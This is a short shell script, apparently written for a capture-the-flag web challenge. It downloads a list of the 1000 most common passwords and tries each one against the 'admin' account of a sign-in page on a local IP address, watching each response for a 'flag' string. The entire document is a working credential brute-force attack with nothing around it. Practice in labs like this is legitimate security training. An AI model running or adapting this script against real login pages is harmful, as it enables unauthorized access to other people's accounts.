#!/bin/sh

HOST='192.168.1.5'
USERNAME='admin'
DICTIONARY=($(curl -s "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"))

GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
WHITE=$(tput setaf 7)

declare -i V=0

for i in ${DICTIONARY[@]};
do
    echo "${WHITE} - trying ${V} : ${i}"
    V+=1
    curl -s "http://$HOST/?page=signin&username=$USERNAME&password=${i}&Login=Login#" | grep flag
    if [ $? -eq 0 ] # Si le status de sortie = 0
    then
        printf "\n"
        echo "${GREEN}Found the password : ${i}"
        exit
    fi
        printf "${RED}Pass not found"
done
